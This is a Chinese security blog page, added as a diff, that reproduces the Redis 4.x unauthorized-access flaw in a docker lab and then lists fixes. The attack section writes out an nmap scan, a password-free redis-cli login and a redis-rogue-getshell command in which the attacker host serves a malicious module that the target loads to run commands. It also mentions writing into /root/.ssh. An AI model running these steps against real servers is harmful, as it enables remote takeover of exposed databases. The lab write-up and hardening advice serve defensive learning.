@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title> | 剣の魔王の小窝</title>
+    <meta name="author" content="剣の魔王" />
+    <meta name="description" content="这个网站没有描述" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/head.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+<link rel="preconnect" href="https://static-argvchs.netlify.app" />
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+
+			<canvas
+			id="fireworks"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+			</canvas>
+			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+			<script src="/js/lib/fireworks.min.js"></script>
+			
+			<canvas
+			id="background"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+			<script src="/js/lib/background.min.js"></script>
+
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>剣の魔王の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1></h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/3
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="Redis未授权访问漏洞复现"><a href="#Redis未授权访问漏洞复现" class="headerlink" title="Redis未授权访问漏洞复现"></a>Redis未授权访问漏洞复现</h2><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。</p>
+<p>Redis未授权访问在4.x/5.0.5以前版本下，可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
+<h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>影响版本</p>
+<p>Redis 4.x/5.0.5以前版本</p>
+<p><strong><span id="more"></span></strong></p>
+<h3 id="三、产生原因"><a href="#三、产生原因" class="headerlink" title="三、产生原因"></a>三、产生原因</h3><ol>
+<li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</li>
+<li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li>
+</ol>
+<h3 id="四、复现过程"><a href="#四、复现过程" class="headerlink" title="四、复现过程"></a>四、复现过程</h3><p>docker 靶机：192.168.145.129</p>
+<p>攻击机 kali: 192.168.145.132</p>
+<p>靶场环境:redis:4.0.14</p>
+<p>docker搭建靶场环境</p>
+<pre><code>docker-compose up -d
+docker-compose ps
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240603-094622.png" alt="image-20240603094619313"></p>
+<p>可以看到redis启动在6379端口</p>
+<p>kali安装redis，依次执行以下命令</p>
+<pre><code>wget http://download.redis.io/releases/redis-2.8.12.tar.gz 
+tar -xzf redis-2.8.12.tar.gz
+cd redis-2.8.12
+make
+cd src
+./redis-cli -h
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240603-094745.png" alt="image-20240603094742962"></p>
+<p>出现帮助信息，表示安装成功</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240603-094844.png" alt="image-20240603094842216"></p>
+<p>nmap扫描靶机，发现6379端口开放</p>
+<pre><code>nmap -sV --open -p- 192.168.145.129
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240603-095028.png" alt="image-20240603095025995"></p>
+<p>redis-cli远程登录redis主机命令</p>
+<pre><code># 无密码登录命令
+redis-cli -h 目标主机IP
+# 有密码登录命令
+redis-cli -h 目标主机IP -p 端口6379 -a 登录密码
+</code></pre>
+<p>使用攻击机redis连接目标机redis</p>
+<pre><code>cd redis-2.8.12/src/
+./redis-cli -h 192.168.145.129
+</code></pre>
+<p>连接成功，查看info信息</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240603-095227.png" alt="image-20240603095225385"></p>
+<p>使用py脚本执行远程命令，下载exp</p>
+<pre><code>git clone https://github.com/vulhub/redis-rogue-getshell.git
+</code></pre>
+<p>进入该目录下</p>
+<pre><code>cd redis-rogue-getshell/RedisModulesSDK/exp
+make //在当前目录下生成一个exp.so文件
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240603-100720.png" alt="image-20240603100718091"></p>
+<p>回到redis-rogue-getshell目录下，利用exp执行命令</p>
+<pre><code>./redis-master.py -r 192.168.145.129 -p 6379 -L 192.168.145.132 -P 1111 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240603-101005.png" alt="image-20240603101003188"></p>
+<h3 id="五、修复方案"><a href="#五、修复方案" class="headerlink" title="五、修复方案"></a>五、修复方案</h3><ol>
+<li><p>禁止绑定公网(本地缓存)</p>
+<p>redis.conf: bind 127.0.0.1 //redis本来就是作为内存数据库，只要监听在本机即可</p>
+</li>
+<li><p>密码验证</p>
+<p>配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中</p>
+</li>
+<li><p>降权运行</p>
+<p>禁止使用 root 权限启动 redis 服务</p>
+<pre><code> vim /etc/redis/redis.conf
+ # By default Redis does not run as a daemon. Use &#39;yes&#39; if you need it.
+ # Note that Redis will write a pid file in /var/run/redis.pid when daemonized.
+ daemonize yes
+</code></pre>
+<p>在降权(deamon)模式下，更改配置文件路径是不允许的，即”config set dir /root/.ssh/“执行失败，从而避免了写任意文件的风险</p>
+</li>
+<li><p>其他</p>
+<ul>
+<li>限定可以连接Redis服务器的IP</li>
+<li>修改Redis默认端口6379</li>
+<li>配置rename-command配置项”RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度</li>
+</ul>
+</li>
+<li><p>禁止从redis写入主模式redis传输的文件</p>
+<pre><code>slave-read-only yes
+</code></pre>
+</li>
+<li><p>自动化检测方案</p>
+<ol>
+<li><p>从running进程redis-server中获取启动参数中的配置文件路径。如果获取失败则从默认路径: /etc/redis/redis.conf</p>
+</li>
+<li><p>检查配置key-value对</p>
+<pre><code>daemonize yes
+bind 127.0.0.1 
+</code></pre>
+</li>
+</ol>
+</li>
+</ol>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q943111495/article/details/121032255">Redis未授权访问漏洞复现_redis 4.0.14 漏洞-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51683653/article/details/129316456">【vulhub漏洞复现】redis 4-unacc 未授权访问漏洞_redis未授权漏洞vulhub靶场复现-CSDN博客</a></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 剣の魔王の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;剣の魔王
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script>
+        console.info("Welcome to Argvchs' blog!");
+        if (!window.hasOwnProperty("ontouchstart")) {
+            let html = '<canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas><script src="https://static-argvchs.netlify.app/js/fireworks.min.js"><\/script>';
+            document.body.append(document.createRange().createContextualFragment(html));
+        }
+    </script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="argvchs/giscus-comments"
+    data-repo-id="R_kgDOI_uC-w"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOI_uC-84CUToF"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
